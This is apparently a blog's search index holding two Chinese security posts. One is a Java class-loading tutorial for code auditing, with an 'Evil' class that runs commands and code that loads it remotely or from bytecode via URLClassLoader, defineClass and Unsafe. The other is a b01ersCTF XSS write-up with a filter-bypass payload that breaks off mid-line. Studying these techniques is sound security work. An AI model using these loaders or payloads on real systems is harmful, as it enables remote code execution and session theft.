<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java代码审计 类加载机制</title>
    <link href="/2024/04/21/blog0031-8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/04/21/blog0031-8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>Java的类加载机制对于我们后续学习许多漏洞利用都有所帮助，因此有必要学习一下类加载的相关知识。</p><p>重点在于如何实现Java的动态类加载机制。</p><span id="more"></span><h1 id="类加载基础">类加载基础</h1><p>这里可以参考博客：<a href="https://pdai.tech/md/java/jvm/java-jvm-classload.html">Java类加载机制</a></p><h2 id="类的生命周期">1、类的生命周期</h2><p>其中类加载的过程包括了<code>加载</code>、<code>验证</code>、<code>准备</code>、<code>解析</code>、<code>初始化</code>五个阶段。在这五个阶段中，<code>加载</code>、<code>验证</code>、<code>准备</code>和<code>初始化</code>这四个阶段发生的顺序是确定的，而<code>解析</code>阶段则不一定，它在某些情况下可以在初始化阶段之后开始，这是为了支持Java语言的运行时绑定(也成为动态绑定或晚期绑定)。另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。</p><p>具体每个阶段发生了什么，建议学习上面博客中的内容。</p><h2 id="类中加载顺序">2、类中加载顺序</h2><p>假设有这样一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> id = <span class="hljs-number">1</span>;<br><br>    Person()&#123;<br>        <span class="hljs-keyword">this</span>.age=<span class="hljs-number">0</span>;<span class="hljs-keyword">this</span>.name=<span class="hljs-string">&quot;No&quot;</span>;<br>        System.out.println(<span class="hljs-string">&quot;无参构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;代码块&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先实例化对象，可以看到依次执行了静态代码块，代码块和无参构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Person();<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 输出：</span><br><span class="hljs-comment">// 静态代码块</span><br><span class="hljs-comment">// 代码块</span><br><span class="hljs-comment">// 无参构造函数</span><br></code></pre></td></tr></table></figure><p>假设我们没执行实例化类，只是对id进行修改（类似的调用静态方法），只输出了静态代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// Person p = new Person();</span><br>        Person.id = <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 输出：</span><br><span class="hljs-comment">// 静态代码块</span><br></code></pre></td></tr></table></figure><p>接下来，我们只是简单获取类的Class关键字，发现并没有任何输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// Person p = new Person();</span><br>        <span class="hljs-comment">// Person.id = 2;</span><br>        Class&lt;Person&gt; personClass = Person.class;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结合这个案例，再结合类的生命周期，大家能够对类的加载顺序有更深的理解。</p><p>类加载的顺序：</p><ol type="1"><li>首先加载的<strong>静态代码块</strong>、构造器、其次分别是静态方法、静态属性</li><li>普通的方法和属性，如果创建对象将调用相关的构造器</li><li>对于静态代码块（没有任何的条件，只要代码加载即可，因此成为恶意代码最常嵌入的地方），静态方法，静态属性，只加载1次。</li><li>对于非静态方法或属性，每当New之后被调用的时候都需要被被加载</li></ol><h1 id="类加载器">类加载器</h1><h2 id="类加载器种类">1、类加载器种类</h2><p>Java类加载器分为自定义类加载器，ApplicationClassLoader，ExtClassLoader，BootStrapClassLoader。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/java_jvm_classload_3.png" alt="img" /></p><p><code>启动类加载器</code>: Bootstrap ClassLoader，负责加载存放在JDK(JDK代表JDK的安装目录，下同)下，或被-Xbootclasspath参数指定的路径中的，并且能被虚拟机识别的类库(如rt.jar，所有的java.*开头的类均被Bootstrap ClassLoader加载)。启动类加载器是无法被Java程序直接引用的。</p><p><code>扩展类加载器</code>: Extension ClassLoader，该加载器由<code>sun.misc.Launcher$ExtClassLoader</code>实现，它负责加载JDK，或者由java.ext.dirs系统变量指定的路径中的所有类库(如javax.*开头的类)，开发者可以直接使用扩展类加载器。</p><p><code>应用程序类加载器</code>: Application ClassLoader，该类加载器由<code>sun.misc.Launcher$AppClassLoader</code>来实现，它负责加载用户类路径(ClassPath)所指定的类，开发者可以直接使用该类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</p><p><code>自定义类加载器</code>: 相较于Java提供的类加载器，我们也可以自定义类加载器，实现动态加载类，比如从网络中或者其他字节流中加载类。</p><h2 id="类加载机制">2、类加载机制</h2><p>类加载的机制具体可以参见开头的那篇博客，这里我们重点介绍双亲委派机制。</p><p>双亲委派的机制，实际完成如下操作：</p><ol type="1"><li>加载某个类之前，先委托给父类加载</li><li>照1的步骤直到Bootstrap ClassLoader，如果未加载，则一步步回溯尝试加载</li><li>如果回溯加载都失败了，则抛出异常<code>ClassNotFoundException</code></li></ol><p>我们看ClassLoader的源码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-keyword">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-keyword">synchronized</span> (getClassLoadingLock(name)) &#123;<br>        <span class="hljs-comment">// First, check if the class has already been loaded</span><br>        Class&lt;?&gt; c = findLoadedClass(name);<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">long</span> t0 = System.nanoTime();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (parent != <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-comment">// 向双亲委派加载</span><br>                    c = parent.loadClass(name, <span class="hljs-keyword">false</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// BootstrapClassLoader是没法被java程序识别，所以要单独处理</span><br>                    c = findBootstrapClassOrNull(name);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>                <span class="hljs-comment">// from the non-null parent class loader</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">// If still not found, then invoke findClass in order</span><br>                <span class="hljs-comment">// to find the class.</span><br>                <span class="hljs-keyword">long</span> t1 = System.nanoTime();<br>                <span class="hljs-comment">// 双亲不能加载，则自己尝试加载</span><br>                c = findClass(name);<br><br>                <span class="hljs-comment">// this is the defining class loader; record the stats</span><br>                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);<br>                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);<br>                sun.misc.PerfCounter.getFindClasses().increment();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (resolve) &#123;<br>            resolveClass(c);<br>        &#125;<br>        <span class="hljs-keyword">return</span> c;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类加载的方法">3、类加载的方法</h2><p>类加载的方法分为两种，一种为隐式类加载，比如对于一个类，我们进行他的实例化，这个类此时显然被加载进来；另一种方式我们称为显示加载，比如使用反射的方式来进行加载。</p><ol type="1"><li>Class.forName()，这种方式加载会进行类的初始化，也就是执行静态代码块中的内容</li><li>Class.getClassLoader().loadClass()，这种方式加载不会进行类的初始化，不执行静态代码块中的内容。</li><li>Class.forName(name, initialize, loader)带参函数也可控制是否加载static块。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象 。</li></ol><h1 id="动态加载类">动态加载类</h1><p>以下，我们将介绍几种方法，来实现一些攻击中常见的恶意类动态加载机制。</p><h2 id="urlclassloader">1、URLClassLoader</h2><p>这个类能够通过URL加载恶意.Class文件或者jar包</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">支持协议<br><span class="hljs-keyword">http</span><br>jar<br><span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>假设我们能够控制URL中的内容，那就存在直接利用URLClassLoader实现远程恶意类加载。</p><p>我们编写一个恶意类，然后创建一个Python Web，通过http加载这个恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意服务启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">javac Evil.java<br>python -m http.server 2333<br></code></pre></td></tr></table></figure><p>接下来通过url来加载恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">urlClassLoaderTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, MalformedURLException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]&#123;<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://localhost:2333/&quot;</span>)&#125;);<br>        Class urlClass = urlClassLoader.loadClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        Method run = urlClass.getMethod(<span class="hljs-string">&quot;run&quot;</span>, String.class);<br>        run.invoke(urlClass.newInstance(), <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        urlClassLoaderTest();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20240421223256733.png" alt="image-20240421223256733" /></p><h2 id="classloader.defineclass">2、ClassLoader.defineClass</h2><p>URLClassLoader需要我们能够访问网络，除了远程加载，我们还能够使用字节码来加载恶意类。</p><p>我们读取类的字节码，然后使用defineClass方法加载。</p><p>注意因为<code>defineClass</code>是<code>protected</code>的方法，我们得使用反射调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.beans.editors.ByteEditor;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">byteCodeClassLoader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Files.readAllBytes(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;src\\main\\java\\Evil.Class&quot;</span>).toPath());<br>        <span class="hljs-comment">// 反射获取加载类方法</span><br>        Class cl = ClassLoader.class;<br>        Method defineClassMethod = cl.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>        defineClassMethod.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">// 反射加载类</span><br>        Class evilClass = (Class)defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), code, <span class="hljs-number">0</span>, code.length);<br>        Method run = evilClass.getMethod(<span class="hljs-string">&quot;run&quot;</span>, String.class);<br>        run.invoke(evilClass.newInstance(), <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        byteCodeClassLoader();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="unsafe.defineclass">3、unSafe.defineClass</h2><p>unSafe类中也可以调用defineClass，但是需要注意的绕过安全检查，所以得利用反射获取到Unsafe的静态变量，变量中存储着对应的Unsafe实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.beans.editors.ByteEditor;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.plugin2.ipc.unix.UnixIPCFactory;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoadTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unsafeClassLoader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Files.readAllBytes(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;src\\main\\java\\Evil.Class&quot;</span>).toPath());<br><br>        Class unsafeClass = Unsafe.class;<br>        <span class="hljs-comment">// 获取静态实例</span><br>        Field theUnsafe = unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe)theUnsafe.get(<span class="hljs-keyword">null</span>);<br><span class="hljs-comment">// 反射加载类</span><br>        Class evilClass = unsafe.defineClass(<span class="hljs-string">&quot;Evil&quot;</span>, code, <span class="hljs-number">0</span>, code.length,<br>                ClassLoader.getSystemClassLoader(),<span class="hljs-keyword">null</span>);<br><br>        Method run = evilClass.getMethod(<span class="hljs-string">&quot;run&quot;</span>, String.class);<br>        run.invoke(evilClass.newInstance(), <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        <span class="hljs-comment">//urlClassLoaderTest();</span><br>        <span class="hljs-comment">//byteCodeClassLoader();</span><br>        unsafeClassLoader();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="templatesimpl">TemplatesImpl</h1>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>Code Audit</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024-b01ersCTF-wp</title>
    <link href="/2024/04/21/blog0048-2024-b01ersCTF-wp/"/>
    <url>/2024/04/21/blog0048-2024-b01ersCTF-wp/</url>
    
    <content type="html"><![CDATA[<p>周末打了一下2024-b01ersCTF，里面的题目还是比较有趣的。这里记录一下。</p><span id="more"></span><h1 id="web">Web</h1><h2 id="b01er-adsxss">b01er-ads（XSS)</h2><p>获取源代码，查看代码的逻辑，发现你传送的content内容会在后台被读取，实际效果就是类似一个盲打XSS。</p><p>XSS 利用点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.get(<span class="hljs-string">&#x27;/admin/view&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (req.cookies.flag === CONFIG.APPFLAG) &#123;<br>        <span class="hljs-comment">// 这里存在XSS利用点</span><br>        res.send(req.query.content);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&#x27;You are not Walter White!&#x27;</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>后台bot的实现，但是存在WAF的过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.post(<span class="hljs-string">&#x27;/review&#x27;</span>, limiter, <span class="hljs-keyword">async</span>(req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> initBrowser = puppeteer.launch(&#123;<br>        <span class="hljs-attr">executablePath</span>: <span class="hljs-string">&quot;/opt/homebrew/bin/chromium&quot;</span>,<br>        <span class="hljs-attr">headless</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">args</span>: [<br>            <span class="hljs-string">&#x27;--disable-dev-shm-usage&#x27;</span>,<br>            <span class="hljs-string">&#x27;--no-sandbox&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-setuid-sandbox&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-gpu&#x27;</span>,<br>            <span class="hljs-string">&#x27;--no-gpu&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-default-apps&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-translate&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-device-discovery-notifications&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-software-rasterizer&#x27;</span>,<br>            <span class="hljs-string">&#x27;--disable-xss-auditor&#x27;</span><br>        ],<br>        <span class="hljs-attr">ignoreHTTPSErrors</span>: <span class="hljs-literal">true</span><br>    &#125;);<br>    <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> initBrowser;<br>    <span class="hljs-keyword">const</span> context = <span class="hljs-keyword">await</span> browser.createBrowserContext()<br>        <span class="hljs-comment">// XSS的防护WAF</span><br>    <span class="hljs-keyword">const</span> content = req.body.content.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">const</span> urlToVisit = CONFIG.APPURL + <span class="hljs-string">&#x27;/admin/view/?content=&#x27;</span> + content;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> context.newPage();<br>        <span class="hljs-keyword">await</span> page.setCookie(&#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;flag&quot;</span>,<br>            <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-attr">value</span>: CONFIG.APPFLAG,<br>            <span class="hljs-attr">url</span>: CONFIG.APPURL<br>        &#125;)<br>        <span class="hljs-keyword">await</span> page.goto(urlToVisit, &#123;<br>            <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle2&#x27;</span><br>        &#125;);<br>        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-comment">// Close</span><br>        <span class="hljs-keyword">await</span> context.close()<br>        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-built_in">console</span>.error(e);<br>        <span class="hljs-keyword">await</span> context.close();<br>        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>对于字符串的过滤，我们可以直接采用String.fromCharCode来实现。需要注意的是，最好不要使用<code>+</code>号来进行字符串拼接，否则你得想清楚你的<code>+</code>号在发送请求的时候是否有没被正确的url编码。</p><p>附上payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">103</span>));</span><br><span class="javascript">        <span 